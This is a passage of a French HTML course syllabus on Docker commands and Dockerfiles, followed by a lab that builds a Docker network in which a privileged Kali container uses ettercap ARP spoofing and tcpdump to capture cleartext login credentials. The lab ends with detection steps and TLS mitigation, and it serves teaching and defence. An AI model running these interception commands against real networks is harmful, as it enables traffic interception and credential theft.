                            <p>ID de conteneur : un identifiant attribué à chaque conteneur en cours d'exécution.</p>
                        </li>
                        <li>
                            <p>Image : l'image Docker utilisée pour créer le conteneur.</p>
                        </li>
                        <li>
                            <p>Commande : la commande en cours d'exécution à l'intérieur du conteneur.</p>
                        </li>
                        <li>
                            <p>Créé : l'heure à laquelle le conteneur a été démarré.</p>
                        </li>
                        <li>
                            <p>Statut : l'état actuel du conteneur (par exemple, en cours d'exécution, quitté).</p>
                        </li>
                        <li>
                            <p>Port : mappages de ports entre la machine hôte et le conteneur.</p>
                        </li>
                        <li>
                            <p>Nom : le nom convivial attribué au conteneur.</p>
                        </li>
                    </ul>
                    <h3>docker stop :</h3>
                    <p>La commande <span class="em">docker stop</span> est utilisée pour arrêter un conteneur Docker en cours d'exécution. Lorsque cette commande est émise, Docker envoie un signal <span class="em">SIGTERM</span> au processus principal à l'intérieur du conteneur, lui donnant la possibilité de s'arrêter correctement.</p>
<pre><code>docker stop id/name</code></pre>
                    <h3>docker rm :</h3>
                    <p>La commande <span class="em">docker rm</span> est utilisée pour supprimer un ou plusieurs conteneurs Docker. Cette commande supprime les conteneurs spécifiés de l'hôte Docker, libérant ainsi toutes les ressources qu'ils utilisaient, telles que l'espace disque.</p>
                    <p>Vous pouvez uniquement supprimer les conteneurs arrêtés; essayer de supprimer un conteneur en cours d'exécution entraînera une erreur, sauf si vous utilisez l'option <span class="em">-f</span> pour le supprimer de force.</p>
<pre><code>docker rm id/nom</code></pre>
                    <h3>docker run :</h3>
                    <p>La commande <span class="em">docker run</span> est une commande unique qui combine plusieurs actions Docker en une seule.</p>
                    <p>Voici un aperçu de ce qui se passe lorsque vous exécutez <span class="em">docker run</span> :</p>
                    <ul>
                        <li>
                            <p>Extrait l'image (si nécessaire).</p>
                        </li>
                        <li>
                            <p>Crée un conteneur.</p>
                        </li>
                        <li>
                            <p>Démarre le conteneur.</p>
                        </li>
                        <li>
                            <p>S'attache à la sortie du conteneur.</p>
                        </li>
                    </ul>
                    <p>Options supplémentaires :</p>
                    <ul>
                        <li>
                            <p><span class="em">-d</span> : exécute le conteneur en arrière-plan (mode détaché).</p>
                        </li>
                        <li>
                            <p><span class="em">-it</span> : mode interactif qui permet d'ouvrir une session de terminal à l'intérieur du conteneur (utile pour le débogage ou l'exécution de commandes interactives).</p>
                        </li>
                        <li>
                            <p><span class="em">-p</span> : publie les ports du conteneur vers l'hôte (par exemple, <span class="em">-p 8080:80</span> mappe le port 80 du conteneur vers le port 8080 sur l'hôte).</p>
                        </li>
                        <li>
                            <p><span class="em">--name</span> : attribuez un nom personnalisé au conteneur au lieu d'un nom généré aléatoirement.</p>
                        </li>
                    </ul>
<pre><code>docker run -d -p 8080:80 --name mywebapp nginx</code></pre>
                    <h3>docker logs :</h3>
                    <p>La commande <span class="em">docker logs</span> est un outil puissant qui vous aide à surveiller et déboguer les conteneurs en vous donnant accès à la sortie du conteneur, même après l'arrêt du conteneur.</p>
<pre><code>docker logs id/name</code></pre>
                    <h3>Laboratoire :</h3>
                    <ol>
                        <li>
                            <p>Créer un conteneur nommé test.</p>
                        </li>
                        <li>
                            <p>Démarrer le conteneur test.</p>
                        </li>
                        <li>
                            <p>Vérifier quand le conteneur a démarré.</p>
                        </li>
                        <li>
                            <p>Arrêter le conteneur.</p>
                        </li>
                        <li>
                            <p>Vérifier quand le conteneur s'est arrêté.</p>
                        </li>
                        <li>
                            <p>Relancer le conteneur test et exposer le sur le port 8989.</p>
                        </li>
                        <li>
                            <p>Ouvrir l'application conteneur sur le navigateur.</p>
                        </li>
                        <li>
                            <p>Supprimer le conteneur.</p>
                        </li>
                    </ol>
                    <ul>
                        <li>
                            <p>Le fichier `<span class="em">index.html</span>` :</p>
<pre><code>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Coucou&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Coucou from Docker !&lt;/h1&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">dockerfile</span>` :</p>
<pre><code># Use nginx as base image
FROM nginx:alpine

# Copy HTML files to nginx webserver directory
COPY index.html /usr/share/nginx/html/

# expose port 80
EXPOSE 80

# Start nginx server
CMD ["nginx", "-g", "daemon off;"]</code></pre>
                        </li>
                        <li>
<pre><code>docker build -t my-nginx .</code></pre>
                            <p>Cette commande sert à construire une image Docker personnalisée à partir d'un fichier Dockerfile présent dans le répertoire courant.</p>
                        </li>
                        <li>
<pre><code>docker run -d --name my-nginx-container -p 8091:80 my-nginx</code></pre>
                            <p>Cette commande démarre un conteneur à partir de l'image Docker <span class="em">my-nginx</span> qu'on a construite juste avant et le rend accessible sur le port 8091 de ta machine hôte.</p>
                        </li>
                    </ul>
                    <p class="em">Nous exécutons une application NGINX...</p>
                    <p class="em">Mais nous voulons déployer notre propre code personnalisé...</p>
                    <p class="em">Comment pouvons-nous y parvenir ?</p>
                    <h3>Dockerfile :</h3>
                    <p>Un Dockerfile est un fichier texte qui contient un ensemble d'instructions utilisées pour créer une image Docker.</p>
                    <p>Il sert de <span class="em">blueprint</span> pour créer des conteneurs Docker, définissant tout ce qui est nécessaire pour configurer l'environnement dans lequel votre application s'exécutera.</p>
                    <h4>Instructions :</h4>
                    <ul>
                        <li>
                            <p><span class="em">FROM</span> : spécifie l'image de base à utiliser pour le conteneur Docker.</p>
                        </li>
                        <li>
                            <p><span class="em">RUN</span> : exécute les commandes pendant le processus de création de l'image Docker.</p>
                        </li>
                        <li>
                            <p><span class="em">CMD</span> : spécifie la commande par défaut à exécuter au démarrage d'un conteneur. Contrairement à <span class="em">RUN</span>, il s'exécute au moment de l'exécution et non pendant la construction.</p>
                        </li>
                        <li>
                            <p><span class="em">ENTRYPOINT</span> : similaire à <span class="em">CMD</span>, mais il configure la commande qui s'exécute toujours.</p>
                        </li>
                        <li>
                            <p><span class="em">COPY</span> : copie les fichiers et répertoires du système de fichiers local dans l'image Docker.</p>
                        </li>
                        <li>
                            <p><span class="em">ADD</span> : similaire à <span class="em">COPY</span>, mais avec des fonctionnalités supplémentaires. Il peut extraire des fichiers compressés (par exemple, <span class="em">.tar</span>, <span class="em">.gz</span>) et récupérer des fichiers à partir d'URL distantes.</p>
                        </li>
                        <li>
                            <p><span class="em">WORKDIR</span> : définit le répertoire de travail pour les instructions ultérieures. Si le répertoire n'existe pas, il sera créé.</p>
                        </li>
                        <li>
                            <p><span class="em">EXPOSE</span> : informe Docker que le conteneur écoute sur un port réseau spécifique au moment de l'exécution. Il ne publie pas réellement le port mais sert de documentation.</p>
                        </li>
                        <li>
                            <p><span class="em">ENV</span> : définit les variables d'environnement dans le conteneur, qui peuvent être utilisées par les processus exécutés à l'intérieur du conteneur.</p>
                        </li>
                        <li>
                            <p><span class="em">USER</span> : spécifie l'utilisateur sous lequel exécuter le conteneur. Par défaut, les conteneurs s'exécutent en tant que <span class="em">root</span>.</p>
                        </li>
                        <li>
                            <p><span class="em">LABEL</span> : ajoute des métadonnées à l'image. Les étiquettes (labels) peuvent être utilisées pour stocker des informations telles que la version, la description ou le responsable de l'image.</p>
                        </li>
                    </ul>
                    <h3>Couches :</h3>
                    <div>
                        <img src="../images/layers_Docker.PNG" alt="" class="float_right">
                        <p>Docker utilise une architecture en couches pour créer des images.  Chaque instruction d'un Dockerfile crée une couche dans l'image finale. Ces couches sont empilées les uns sur les autres pour former l'image complète. Le principe de superposition offre plusieurs avantages, notamment l'efficacité, la réutilisabilité et la mise en cache.</p>
                        <p>Avantages de l'architecture en couches :</p>
                        <ul>
                            <Li>
                                <p>Efficacité</p>
                            </Li>
                            <li>
                                <p>Réutilisabilité</p>
                            </li>
                            <li>
                                <p>Petites mises à jour</p>
                            </li>
                        </ul>
                        <p class="em">Attention à la commande !</p>
                    </div>
                    <h3>Build :</h3>
                    <p>La commande <span class="em">docker build</span> est utilisée pour créer une image Docker à partir d'un Dockerfile et de son contexte (les fichiers et répertoires disponibles au chemin spécifié). Cette commande compile toutes les instructions spécifiées dans le Dockerfile dans une image qui peut ensuite être utilisée pour créer des conteneurs.</p>
                    <h3>Dockerfile :</h3>
                    <p>Un Dockerfile est un script qui consiste en un ensemble d'instructions sur la façon de créer une image Docker. Ces instructions incluent la spécification du système d'exploitation, des langues, des variables d'environnement Docker, des emplacements des fichiers, des ports réseau et d'autres composants nécessaires à l'exécution de l'image. Toutes les commandes du fichier sont regroupées et exécutées automatiquement.</p>
                    <p>Une image comporte plusieurs couches. Une fois que vous exécutez une image Docker pour créer un conteneur, une nouvelle couche en lecture-écriture est ajoutée. C'est ce qu'on appelle parfois la couche conteneur. La couche supplémentaire vous permet d'apporter des modifications à l'image de base, que vous pouvez valider pour créer une nouvelle image Docker pour une utilisation future.</p>
                </article>
                <article>
                    <h2 id="creation_environnement_pentest_Docker">Création d'un environnement de pentest avec Docker :</h2>
                    <h3>Introduction :</h3>
                    <p>L'objectif de ce cours est de fournir une compréhension complète des attaques d'usurpation d'identité ARP (ARP spoofing) dans un environnement réseau Docker. Nous explorerons les vulnérabilités associées à l'utilisation de protocoles non sécurisés et démontrerons les risques potentiels qu'ils posent pour la sécurité du réseau.</p>
                    <p class="em">Comment fonctionne l'ARP (Address Resolution Protocol) ?</p>
                    <h3>Protocole ARP :</h3>
                    <ul>
                        <li>
                            <p>Au niveau de la couche 3 (couche réseau), la plupart des programmes informatiques ou des applications utilisent des adresses logiques (adresses IP) pour envoyer et recevoir des messages.</p>
                        </li>
                        <li>
                            <p>Cependant, la communication réelle a lieu au niveau de la couche 2 (couche liaison de données) à l'aide d'adresses physiques (adresses MAC).</p>
                        </li>
                    </ul>
                    <p>Pour faciliter cette communication, l'adresse MAC de destination doit être déterminée pour permettre aux appareils de se connecter. C'est là qu'ARP (Address Resolution Protocol) entre en jeu; son rôle est de traduire les adresses IP (couche 3) en adresses MAC correspondantes (couche 2).</p>
                    <h3>Table ARP :</h3>
                    <p>Une fois l'adresse MAC obtenue, elle est stockée dans la table ARP, qui fait office de liste de contacts.</p>
                    <p>Tout comme une liste de contacts téléphoniques associe des noms à des numéros de téléphone, la table ARP associe les adresses IP à leurs adresses MAC correspondantes, permettant une référence rapide dans les communications futures.</p>
                    <img src="../images/ARP_table.PNG" alt="">
                    <h3>Rappel : protocole ARP :</h3>
                    <div>
                        <img src="../images/ARP_spoofing_attack.PNG" alt="" class="float_right">
                        <p>Lors d'une spoofing attack ARP, l'attaquant incite les appareils du réseau à associer leur propre adresse MAC à l'adresse IP d'un autre appareil. Cette tromperie permet à l'attaquant d'intercepter, de modifier ou de bloquer les communications destinées à cette adresse IP, tout comme il pourrait le faire avec le contact téléphonique.</p>
                    </div>
                    <p class="em">Où est le danger ?</p>
                    <h3>Couche 1 : sniffing :</h3>
                    <div>
                        <img src="../images/software_wireshark.PNG" alt="" class="float_right">
                        <p>Logiciel (Wireshark) ou matériel</p>
                    </div>
                    <h3>Couche 7 : HTTP :</h3>
                    <p>Le protocole HTTP contrôle la façon dont le client formule ses demandes et la façon dont le serveur y répond. Le protocole HTTP connaît différentes méthodes de requêtes. Plus de détails lors des prochains cours.</p>
                    <p>Le protocole n'offre aucune sécurité de communication. En effet, les informations sont transmises "en clair" sur Internet. Ce qui veut dire qu'il est possible pour un pirate informatique de récolter des informations confidentielles.</p>
                    <h3>Types de réseaux Docker (drivers) :</h3>
                    <p>Docker fournit plusieurs pilotes réseau intégrés, chacun répondant à différents besoins réseau pour les conteneurs :</p>
                    <ul>
                        <li>
                            <p><span class="em">bridge</span> : le pilote réseau par défaut. Il crée un réseau interne privé sur l'hôte Docker, permettant aux conteneurs du même hôte de communiquer entre eux.</p>
                        </li>
                        <li>
                            <p><span class="em">host</span> : supprime l'isolation réseau entre un conteneur et l'hôte Docker. Le conteneur partage la pile réseau de l'hôte, ce qui donne l'impression que le conteneur s'exécute directement sur l'hôte.</p>
                        </li>
                        <li>
                            <p><span class="em">none</span> : isole complètement un conteneur de tous les réseaux. Il ne fournit aucune interface réseau, coupant ainsi toute communication externe.</p>
                        </li>
                        <li>
                            <p><span class="em">overlay</span> : connecte plusieurs démons Docker (hôtes) pour former un seul réseau virtuel. Ceci est utile pour le clustering ou lorsque les conteneurs doivent communiquer entre différents hôtes.</p>
                        </li>
                        <li>
                            <p><span class="em">ipvlan</span> : offre plus de contrôle sur le trafic réseau en vous permettant d'attribuer des adresses IPv4 et IPv6 directement aux conteneurs, sans dépendre de la gestion réseau interne de Docker.</p>
                        </li>
                        <li>
                            <p><span class="em">macvlan</span> : attribue une adresse MAC unique à chaque conteneur, le faisant apparaître comme un périphérique physique distinct sur le réseau, ce qui peut être utile lorsque les conteneurs doivent être directement connectés.</p>
                        </li>
                    </ul>
                    <h3>Network : bridge :</h3>
                    <div>
                        <img src="../images/network_bridge.PNG" alt="" class="float_right">
                        <p>C'est le pilote réseau par défaut. Il crée un réseau interne privé sur l'hôte Docker, permettant aux conteneurs sur le même hôte de communiquer les uns avec les autres.</p>
                    </div>
                    <h3>Lab : Docker Network :</h3>
                    <ul>
                        <li>
                            <p>Créez un nouveau réseau nommé "lab" à l'aide du pilote "bridge" :</p>
<pre><code>docker network create --driver bridge lab</code></pre>
                        </li>
                        <li>
                            <p>Listez tous les réseaux disponibles sur l'hôte Docker :</p>
<pre><code>docker network list</code></pre>
                        </li>
                    </ul>
                    <img src="../images/docker_network.PNG" alt="">
                    <h3>Lab : ajouter un client au réseau :</h3>
                    <p>Ajoutez deux conteneurs Docker, nommés client1 et client2 dans le réseau "lab".</p>
                    <ul>
                        <li>
<pre><code>docker run -dit --name client1 --network lab alpine sh</code></pre>
                        </li>
                        <li>
<pre><code>docker run -dit --name client2 --network lab alpine sh</code></pre>
                        </li>
                        <li>
                            <p><span class="em">-i</span> : permet une saisie interactive (rester debout)</p>
                        </li>
                        <li>
                            <p><span class="em">-d</span>: mode détaché (c'est-à-dire en arrière-plan)</p>
                        </li>
                        <li>
                            <p><span class="em">-t</span> : alloue un pseudo-TTY (une interface de terminal)</p>
                        </li>
                    </ul>
                    <img src="../images/docker_network_1.PNG" alt="">
                    <h3>Lab : ping client2 depuis client1 :</h3>
                    <p>Il faut deux terminaux avec "client1" et "client2" en exécutant la commande suivante selon la victime :</p>
<pre><code>docker exec -it client1 sh</code></pre>
<pre><code>docker exec -it client2 sh</code></pre>
                        <p>Cette commande te permet d'ouvrir un shell interactif dans un conteneur Docker existant.</p>
                    <ul>
                        <li>
                            <p>Trouver les adresses IP des clients :</p>
<pre><code>ifconfig</code></pre>
                        </li>
                        <li>
                            <p>Exécuter le ping :</p>
                            <p>Dans le terminal "client1" :</p>
<pre><code>ping 172.19.0.3</code></pre>
                            <p>Dans le terminal "client2" :</p>
<pre><code>ping 172.19.0.2</code></pre>
                        </li>
                        <li>
                            <p>Vérifier les tables ARP :</p>
<pre><code>arp -a</code></pre>
                        </li>
                    </ul>
                    <h3>Lab : ajouter un serveur HTTP dans le conteneur client 2 :</h3>
                    <ul>
                        <li>
                            <p>ajouter une application Web</p>
                        </li>
                        <li>
                            <p>Dans le terminal "client2" :</p>
<pre><code>apk add --no-cache python3 py3-pip</code></pre>
                        </li>
                        <li>
                            <p>Dans le terminal "client2" :</p>
<pre><code>vim app.py</code></pre>
                            <p>Le fichier `<span class="em">app.py</span>` est :</p>
<pre><code>from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse as urlparse
 
class AuthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the path
        parsed_path = urlparse.urlparse(self.path)
        # Root endpoint ("/") that returns "Hello, World!"
        if parsed_path.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Hello, World!\n")
        # Auth endpoint ("/auth") that checks user and password
        elif parsed_path.path == '/auth':
            # Parse query parameters
            query_components = urlparse.parse_qs(parsed_path.query)
            # Get the 'user' and 'password' parameters
            user = query_components.get('user', [None])[0]
            password = query_components.get('password', [None])[0]
            # Check if credentials match
            if user == 'root' and password == 'root':
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"connected\n")
            else:
                self.send_response(403)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"forbidden\n")
        # Handle other paths
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Not Found\n")
 
# Set up and start the server
server_address = ('', 8080)
httpd = HTTPServer(server_address, AuthHandler)
print("Serving on port 8080...")
httpd.serve_forever()</code></pre>
                            <p>Pour quitter, il faut taper la commande <span class="em">:wq!</span>.</p>
<pre><code>python app.py</code></pre>
                            <p>Cette commande affichera la ligne suivante dans le terminal :</p>
<pre><code>Serving on port 8080...</code></pre>
                        </li>
                        <li>
                            <p>Dans le terminal "client1" :</p>
<pre><code>apk add curl</code></pre>
<pre><code>curl "http://172.19.0.3:8080/auth?user=root&amp;password=root"</code></pre>
                        </li>
                    </ul>
                    <img src="../images/docker_network_1.PNG" alt="">
                    <h3>ARP spoofing :</h3>
                    <ul>
                        <li>
                            <p>Dans le 3<sup>ème</sup> terminal nommé "attacker" :</p>
<pre><code>docker run -dit --privileged --name attacker --network lab kalilinux/kali-rolling sh</code></pre>
                            <p>Sous certaines images, <span class="em">sh</span> ne peut pas existe et on préfère <span class="em">bash</span>. Aussi l'option <span class="em">--privileged</span> donne énormément de droits - c'est intentionnel pour attaque mais il faut l'expliquer (danger).</p>
                        </li>
                        <li>
                            <p>Dans le terminal "attacker" :</p>
<pre><code>apt-get update</code></pre>
<pre><code>apt-get install -y ettercap-text-only</code></pre>
                        </li>
                        <li>
                            <p>Dans le terminal "attacker" :</p>
<pre><code>apt install -y net-tools</code></pre>
                            <p>Dans <span class="em">Alpine</span>, la commande <span class="em">ifconfig</span> est souvent absente, c'est pour cela qu'on doit installer <span class="em">net-tools</span> ou alors utiliser la commande suivante :</p>
<pre><code>ip addr show</code></pre>
                            <p>Ou encore la commande abrégée :</p>
<pre><code>ip a</code></pre>
                        </li>
                        <li>
                            <p>Dans le terminal "attacker" :</p>
<pre><code>ettercap -T -q -i eth0 -M arp:remote /172.19.0.2// /172.19.0.3//</code></pre>
                        </li>
                        <li>
                            <p>Dans un 4<sup>ème</sup> terminal nommé "attacker2" :</p>
<pre><code>docker exec -it attacker sh</code></pre>
<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre>
                        </li>
                        <li>
                            <p>Dans le terminal "attacker2" :</p>
<pre><code>tcpdump -i eth0 -n -c 20</code></pre>
                            <img src="../images/docker_network_2.PNG" alt="">
                            <p>La commande précédente sert à capturer et afficher les paquets réseau circulant sur une interface réseau donnée.</p>
                        </li>
                        <li>
                            <p>Exécuter <span class="em">arp -a</span> dans le terminal "client1" et "client2"</p>
                        </li>
                        <li>
                            <p>Dans le terminal "client1" :</p>
<pre><code>curl "http://172.19.0.3:8080/auth?user=root&amp;password=root"</code></pre>
                        </li>
                        <li>
                            <p>Vérifier le résultat :</p>
                            <p>Dans le terminal "attacker", on voit qu'il a récupéré le USER et le PASSWORD.</p>
                        </li>
                    </ul>
                    <h3>Comment détecter le problème ?</h3>
                    <p>Il vous suffit de vérifier votre table ARP (commande `<span class="em">arp -a</span>`).</p>
                    <p>Vous êtes victime de l'attaque dans le cas où la table affiche deux adresses IP ayant la même adresse MAC.</p>
                    <h3>Comment traiter le problème ?</h3>
                    <ul>
                        <li>
                            <p>Tables ARP statiques</p>
                        </li>
                        <li>
                            <p>Sécuriser switch (Dynamic ARP Inspection)</p>
                        </li>
                        <li>
                            <p>Isolation du réseau</p>
                        </li>
                        <li>
                            <p>Chiffrement</p>
                        </li>
                    </ul>
                    <h3>Passer à TLS :</h3>
                    <ul>
                        <li>
                            <p>Générer des certificats</p>
                        </li>
                        <li>
                            <p>Adapter l'application</p>
                        </li>
                        <li>
                            <p>Retenter l'attaque</p>
                        </li>
                    </ul>
                    <h3>Ajouter le certificat CA :</h3>
                    <p>Ajoutez le certificat CA dans le client :</p>
<pre><code>apk add ca-certificates</code></pre>
<pre><code>cp ca.crt /usr/local/share/ca-certificates/ca.crt</code></pre>
<pre><code>sudo update-ca-certificates</code></pre>
                </article>
            <!-- fin de section -->
            </section>
        </main>
        <footer role="contentinfo">
            <div>
                <address>
                    Professeurs :
                    <a class="mail" href="mailto:olivier.choquet@vinci.be">Choquet Olivier</a>
                    <a class="mail" href="mailto:driss.vandenheede.techinfo@gmail.com">Vandenheede Driss</a>
                </address>
            </div>
            <div>
                <p>Si vous détectez une erreur, une faute d'orthographe, n'hésitez pas à envoyer un mail aux adresses juste à côté avec le nom de la page et l'erreur détectée.</p>
            </div>
            <div id="version">
                <p>Syllabus HTML</p>
                <p>Version 5.0</p>
            </div>
        </footer>
        <script src="../pre.js"></script>
    </body>
</html>